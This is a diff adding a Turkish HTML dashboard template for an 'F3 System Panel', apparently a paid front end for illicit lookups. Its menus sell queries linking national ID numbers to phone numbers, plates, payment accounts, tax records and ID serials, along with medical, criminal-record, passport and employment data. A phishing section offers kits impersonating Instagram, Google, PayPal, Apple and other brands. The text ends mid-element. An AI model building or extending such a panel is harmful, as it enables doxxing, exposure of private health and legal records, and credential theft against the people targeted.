@@ -1,0 +1,1510 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>F3 System Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary-color: #0f172a;
+            --secondary-color: #1e293b;
+            --accent-color: #3b82f6;
+            --accent-hover: #2563eb;
+            --text-primary: #ffffff;
+            --text-secondary: #cbd5e1;
+            --text-accent: #60a5fa;
+            --border-color: #334155;
+            --success-color: #10b981;
+            --warning-color: #f59e0b;
+            --premium-color: #fbbf24;
+            --free-color: #8b5cf6;
+            --verified-color: #3b82f6;
+            --menu-width: 260px;
+            --menu-collapsed-width: 70px;
+        }
+
+        body {
+            background-color: var(--primary-color);
+            color: var(--text-primary);
+            overflow-x: hidden;
+            height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            height: 100vh;
+            transition: all 0.3s ease;
+        }
+
+        /* Sidebar Menü */
+        .sidebar {
+            width: var(--menu-width);
+            background-color: var(--secondary-color);
+            border-right: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            transition: all 0.3s ease;
+            overflow-y: auto;
+            overflow-x: hidden;
+            position: relative;
+            z-index: 100;
+        }
+
+        .sidebar.collapsed {
+            width: var(--menu-collapsed-width);
+        }
+
+        /* Menü Başlık ve Profil */
+        .menu-header {
+            padding: 20px 15px;
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .profile-section {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .profile-img-container {
+            position: relative;
+            margin-right: 12px;
+        }
+
+        .profile-img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent-color), #8b5cf6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+            border: 2px solid var(--accent-color);
+        }
+
+        .verified-badge {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background-color: var(--verified-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 10px;
+            border: 2px solid var(--secondary-color);
+        }
+
+        .profile-info {
+            flex: 1;
+        }
+
+        .profile-name {
+            font-weight: 700;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 4px;
+        }
+
+        .verified-text {
+            color: var(--verified-color);
+            font-size: 12px;
+            margin-left: 6px;
+            display: flex;
+            align-items: center;
+        }
+
+        .status {
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--success-color);
+            margin-right: 8px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .profile-stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .stat-item {
+            text-align: center;
+            flex: 1;
+        }
+
+        .stat-value {
+            font-weight: 700;
+            font-size: 16px;
+            color: var(--accent-color);
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-top: 3px;
+        }
+
+        /* Menü Kategorileri */
+        .menu-categories {
+            padding: 20px 0;
+            flex: 1;
+        }
+
+        .category-title {
+            padding: 10px 15px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+        }
+
+        .category-item {
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border-left: 3px solid transparent;
+            position: relative;
+        }
+
+        .category-item:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+            border-left-color: var(--accent-color);
+        }
+
+        .category-item.active {
+            background-color: rgba(59, 130, 246, 0.1);
+            border-left-color: var(--accent-color);
+        }
+
+        .category-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            color: var(--text-accent);
+            font-size: 16px;
+        }
+
+        .category-text {
+            flex: 1;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .category-arrow {
+            color: var(--text-secondary);
+            font-size: 12px;
+            transition: transform 0.3s ease;
+        }
+
+        .category-item.expanded .category-arrow {
+            transform: rotate(90deg);
+            color: var(--accent-color);
+        }
+
+        /* Alt Kategori */
+        .subcategories {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+            background-color: rgba(0, 0, 0, 0.2);
+        }
+
+        .category-item.expanded + .subcategories {
+            max-height: 2000px;
+            transition: max-height 0.5s ease-in;
+        }
+
+        .subcategory-item {
+            padding: 10px 15px 10px 50px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .subcategory-item:last-child {
+            border-bottom: none;
+        }
+
+        .subcategory-item:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+            color: var(--accent-color);
+            padding-left: 53px;
+        }
+
+        .subcategory-icon {
+            margin-right: 10px;
+            font-size: 11px;
+            color: var(--text-accent);
+            min-width: 15px;
+        }
+
+        /* Free ve VIP simgeleri */
+        .badge {
+            margin-left: 8px;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 8px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        .free-badge {
+            background-color: rgba(139, 92, 246, 0.15);
+            color: var(--free-color);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+        }
+
+        .vip-badge {
+            background-color: rgba(251, 191, 36, 0.15);
+            color: var(--premium-color);
+            border: 1px solid rgba(251, 191, 36, 0.3);
+        }
+
+        /* Ana İçerik Alanı */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Üst Navbar */
+        .navbar {
+            height: 60px;
+            background-color: var(--secondary-color);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+        }
+
+        .left-nav {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 22px;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--accent-color), #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+
+        .logo-subtitle {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-left: 8px;
+            font-weight: normal;
+        }
+
+        .right-nav {
+            display: flex;
+            align-items: center;
+        }
+
+        .menu-toggle {
+            background: none;
+            border: none;
+            color: var(--text-primary);
+            font-size: 20px;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            margin-left: 15px;
+        }
+
+        .menu-toggle:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .nav-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(255, 255, 255, 0.05);
+            color: var(--text-primary);
+            margin-left: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .notification-badge {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #ef4444;
+        }
+
+        /* Dashboard İçeriği */
+        .dashboard-content {
+            flex: 1;
+            padding: 25px;
+            overflow-y: auto;
+        }
+
+        .welcome-section {
+            margin-bottom: 30px;
+        }
+
+        .welcome-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(to right, #ffffff, var(--text-accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .welcome-subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+            max-width: 600px;
+        }
+
+        .dashboard-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background-color: var(--secondary-color);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            border-color: var(--accent-color);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .card-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 10px;
+            background-color: rgba(59, 130, 246, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent-color);
+            font-size: 20px;
+            margin-right: 15px;
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .card-value {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .card-footer {
+            font-size: 13px;
+            color: var(--text-secondary);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .positive {
+            color: var(--success-color);
+        }
+
+        .negative {
+            color: #ef4444;
+        }
+
+        /* Hızlı İşlemler */
+        .quick-actions {
+            margin-bottom: 30px;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        .section-title i {
+            margin-right: 10px;
+            color: var(--accent-color);
+        }
+
+        .actions-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 15px;
+        }
+
+        .action-btn {
+            background-color: var(--secondary-color);
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            color: var(--text-primary);
+        }
+
+        .action-btn:hover {
+            transform: translateY(-3px);
+            border-color: var(--accent-color);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .action-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+            background-color: rgba(59, 130, 246, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent-color);
+            font-size: 22px;
+            margin-bottom: 12px;
+        }
+
+        .action-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .action-desc {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        /* Premium Çözümler */
+        .premium-solutions {
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            border-radius: 12px;
+            padding: 25px;
+            border: 1px solid var(--premium-color);
+            margin-top: 30px;
+        }
+
+        .premium-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .premium-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+            background-color: rgba(251, 191, 36, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--premium-color);
+            font-size: 24px;
+            margin-right: 15px;
+        }
+
+        .premium-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--premium-color);
+        }
+
+        .premium-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 15px;
+        }
+
+        .premium-item {
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            border: 1px solid rgba(251, 191, 36, 0.3);
+            display: flex;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+
+        .premium-item:hover {
+            background-color: rgba(251, 191, 36, 0.05);
+            border-color: var(--premium-color);
+        }
+
+        .premium-item-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            background-color: rgba(251, 191, 36, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--premium-color);
+            margin-right: 12px;
+        }
+
+        .premium-item-title {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        /* Responsive Tasarım */
+        @media (max-width: 992px) {
+            .sidebar {
+                position: fixed;
+                height: 100%;
+                z-index: 1000;
+                left: -100%;
+            }
+
+            .sidebar.active {
+                left: 0;
+            }
+
+            .overlay {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5);
+                z-index: 999;
+            }
+
+            .overlay.active {
+                display: block;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .dashboard-cards {
+                grid-template-columns: 1fr;
+            }
+
+            .actions-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .premium-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Scrollbar Stili */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--secondary-color);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Sidebar Menü -->
+        <div class="sidebar" id="sidebar">
+            <!-- Profil Kısmı -->
+            <div class="menu-header">
+                <div class="profile-section">
+                    <div class="profile-img-container">
+                        <div class="profile-img">FK</div>
+                        <div class="verified-badge">
+                            <i class="fas fa-check"></i>
+                        </div>
+                    </div>
+                    <div class="profile-info">
+                        <div class="profile-name">
+                            {{ username }}
+                            <span class="verified-text">
+                                <i class="fas fa-check-circle"></i> Doğrulanmış
+                            </span>
+                        </div>
+                        <div class="status">
+                            <div class="status-dot"></div>
+                            <span>Çevrimiçi - {{ plan_name }} Üye</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="profile-stats">
+                    <div class="stat-item">
+                        <div class="stat-value">{{ key.usage_count }}</div>
+                        <div class="stat-label">Toplam Sorgu</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">{{ today_calls }}</div>
+                        <div class="stat-label">Bugün</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">{{ remaining }}</div>
+                        <div class="stat-label">Kalan Süre</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Kategoriler - SADECE BACKENDDEKİ APIS DICTIONARY'SİNDEN ALINDI -->
+            <div class="menu-categories">
+                <div class="category-title">Sorgu Kategorileri</div>
+
+                <!-- 1. TC VE GSM API'LERİ (Zyrdaware) -->
+                <div class="category-item">
+                    <div class="category-icon">
+                        <i class="fas fa-id-card"></i>                                                                                                                      </div>
+                    <div class="category-text">TC ve GSM Sorguları</div>
+                    <div class="category-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <div class="subcategories">
+                    <div class="subcategory-item" onclick="goToApi('adsoyad')">
+                        <i class="fas fa-user subcategory-icon"></i>
+                        Ad Soyad TC Sorgu
+                        <span class="badge free-badge"><i class="fas fa-tag"></i> FREE</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('gsmtc')">
+                        <i class="fas fa-phone subcategory-icon"></i>                                                                                                           GSM → TC Sorgu
+                        <span class="badge free-badge"><i class="fas fa-tag"></i> FREE</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('tcgsm')">
+                        <i class="fas fa-mobile-alt subcategory-icon"></i>
+                        TC → GSM Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                </div>
+
+                <!-- 2. PLAKA API'LERİ (PlakaF3) -->
+                <div class="category-item">
+                    <div class="category-icon">
+                        <i class="fas fa-car"></i>
+                    </div>
+                    <div class="category-text">Plaka Sorguları</div>
+                    <div class="category-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <div class="subcategories">
+                    <div class="subcategory-item" onclick="goToApi('plaka')">
+                        <i class="fas fa-car subcategory-icon"></i>
+                        TC → Plaka Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('adsoyadplaka')">
+                        <i class="fas fa-user-friends subcategory-icon"></i>
+                        Ad Soyad Plaka Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('adplaka')">
+                        <i class="fas fa-user subcategory-icon"></i>
+                        Sadece Ad Plaka Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('soyadplaka')">
+                        <i class="fas fa-signature subcategory-icon"></i>
+                        Sadece Soyad Plaka Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                </div>
+
+                <!-- 3. PAPARA API'LERİ -->
+                <div class="category-item">
+                    <div class="category-icon">
+                        <i class="fas fa-money-bill-wave"></i>
+                    </div>
+                    <div class="category-text">Papara Sorguları</div>
+                    <div class="category-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <div class="subcategories">
+                    <div class="subcategory-item" onclick="goToApi('papara')">
+                        <i class="fas fa-search-dollar subcategory-icon"></i>
+                        Papara Numarası Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('adsoyadpapara')">
+                        <i class="fas fa-user-tag subcategory-icon"></i>
+                        Ad Soyad Papara Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('adpapara')">
+                        <i class="fas fa-user-circle subcategory-icon"></i>
+                        Sadece Ad Papara Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('papara_alternatif')">
+                        <i class="fas fa-search-dollar subcategory-icon"></i>
+                        Papara Sorgu (Alternatif)
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                </div>
+
+                <!-- 4. ECZANE API'LERİ -->
+                <div class="category-item">
+                    <div class="category-icon">
+                        <i class="fas fa-pills"></i>
+                    </div>
+                    <div class="category-text">Eczane Sorguları</div>
+                    <div class="category-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <div class="subcategories">
+                    <div class="subcategory-item" onclick="goToApi('adeczane')">
+                        <i class="fas fa-user-md subcategory-icon"></i>
+                        Ad Eczane Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('ileczane')">
+                        <i class="fas fa-map-marker-alt subcategory-icon"></i>
+                        İl Eczane Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                </div>
+
+                <!-- 5. SERİ NO API'LERİ -->
+                <div class="category-item">
+                    <div class="category-icon">
+                        <i class="fas fa-hashtag"></i>
+                    </div>
+                    <div class="category-text">Seri No Sorguları</div>
+                    <div class="category-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <div class="subcategories">
+                    <div class="subcategory-item" onclick="goToApi('tcserino')">
+                        <i class="fas fa-id-card subcategory-icon"></i>
+                        TC Seri No Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('adsoyadserino')">
+                        <i class="fas fa-users subcategory-icon"></i>
+                        Ad Soyad Seri No Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('adserino')">
+                        <i class="fas fa-user subcategory-icon"></i>
+                        Sadece Ad Seri No Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('soyadserino')">
+                        <i class="fas fa-signature subcategory-icon"></i>
+                        Sadece Soyad Seri No Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('ililceserino')">
+                        <i class="fas fa-map-marker-alt subcategory-icon"></i>
+                        İl İlçe Seri No Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('serino_direct')">
+                        <i class="fas fa-barcode subcategory-icon"></i>
+                        Seri No Doğrudan Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('adilserino')">
+                        <i class="fas fa-map-marker-alt subcategory-icon"></i>
+                        Ad İl Seri No Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                </div>
+
+                <!-- 6. VERGİ API'LERİ -->
+                <div class="category-item">
+                    <div class="category-icon">
+                        <i class="fas fa-file-invoice-dollar"></i>
+                    </div>
+                    <div class="category-text">Vergi Sorguları</div>
+                    <div class="category-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <div class="subcategories">
+                    <div class="subcategory-item" onclick="goToApi('advergi')">
+                        <i class="fas fa-user-tie subcategory-icon"></i>
+                        Ad Vergi Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('ilcevergidairesi')">
+                        <i class="fas fa-file-invoice subcategory-icon"></i>
+                        İlçe Vergi Dairesi Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('vergino')">
+                        <i class="fas fa-file-invoice-dollar subcategory-icon"></i>
+                        Vergi No Sorgulama
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('vergilimit')">
+                        <i class="fas fa-chart-bar subcategory-icon"></i>
+                        Vergi Limitli Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                </div>
+
+                <!-- 7. PHISHING API'LERİ -->
+                <div class="category-item">
+                    <div class="category-icon">
+                        <i class="fas fa-fish"></i>
+                    </div>
+                    <div class="category-text">Phishing İşlemleri</div>
+                    <div class="category-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <div class="subcategories">
+                    <div class="subcategory-item" onclick="goToApi('phishing_create')">
+                        <i class="fas fa-link subcategory-icon"></i>
+                        Phishing Link Oluşturma
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_instagram')">
+                        <i class="fab fa-instagram subcategory-icon"></i>
+                        Instagram Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_facebook')">
+                        <i class="fab fa-facebook subcategory-icon"></i>
+                        Facebook Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_netflix')">
+                        <i class="fas fa-tv subcategory-icon"></i>
+                        Netflix Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_tiktok')">
+                        <i class="fab fa-tiktok subcategory-icon"></i>
+                        TikTok Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_twitter')">
+                        <i class="fab fa-twitter subcategory-icon"></i>
+                        Twitter Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_google')">
+                        <i class="fab fa-google subcategory-icon"></i>
+                        Google Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_microsoft')">
+                        <i class="fab fa-microsoft subcategory-icon"></i>
+                        Microsoft Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_spotify')">
+                        <i class="fab fa-spotify subcategory-icon"></i>
+                        Spotify Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_steam')">
+                        <i class="fab fa-steam subcategory-icon"></i>
+                        Steam Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_discord')">
+                        <i class="fab fa-discord subcategory-icon"></i>
+                        Discord Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_paypal')">
+                        <i class="fab fa-paypal subcategory-icon"></i>
+                        PayPal Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_amazon')">
+                        <i class="fab fa-amazon subcategory-icon"></i>
+                        Amazon Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_apple')">
+                        <i class="fab fa-apple subcategory-icon"></i>
+                        Apple Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_epicgames')">
+                        <i class="fas fa-gamepad subcategory-icon"></i>
+                        Epic Games Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('phishing_whatsapp')">
+                        <i class="fab fa-whatsapp subcategory-icon"></i>
+                        WhatsApp Phishing
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                </div>
+
+                <!-- 8. PANEL API'LERİ - TC BAZLI SORGULAR -->
+                <div class="category-item">
+                    <div class="category-icon">
+                        <i class="fas fa-database"></i>
+                    </div>
+                    <div class="category-text">Panel API'leri</div>
+                    <div class="category-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <div class="subcategories">
+                    <div class="subcategory-item" onclick="goToApi('nufus')">
+                        <i class="fas fa-users subcategory-icon"></i>
+                        Nüfus Sorgulama
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('asi_kayitlari')">
+                        <i class="fas fa-syringe subcategory-icon"></i>
+                        Aşı Kayıtları
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('rontgen_listesi')">
+                        <i class="fas fa-x-ray subcategory-icon"></i>
+                        Röntgen Listesi
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('recete_gecmisi')">
+                        <i class="fas fa-file-prescription subcategory-icon"></i>
+                        Reçete Geçmişi
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('adli_sicil')">
+                        <i class="fas fa-file-contract subcategory-icon"></i>
+                        Adli Sicil Kaydı
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('pasaport')">
+                        <i class="fas fa-passport subcategory-icon"></i>
+                        Pasaport Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('ehliyet')">
+                        <i class="fas fa-id-card-alt subcategory-icon"></i>
+                        Ehliyet Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('arac_sahibi')">
+                        <i class="fas fa-car-side subcategory-icon"></i>
+                        Araç Sahibi Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('sgk_ise_giris')">
+                        <i class="fas fa-briefcase subcategory-icon"></i>
+                        SGK İşe Giriş
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('ogrenci_durum')">
+                        <i class="fas fa-graduation-cap subcategory-icon"></i>
+                        Öğrenci Durumu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('kronik_hastalik')">
+                        <i class="fas fa-stethoscope subcategory-icon"></i>
+                        Kronik Hastalık
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('vergi_borc')">
+                        <i class="fas fa-file-invoice-dollar subcategory-icon"></i>
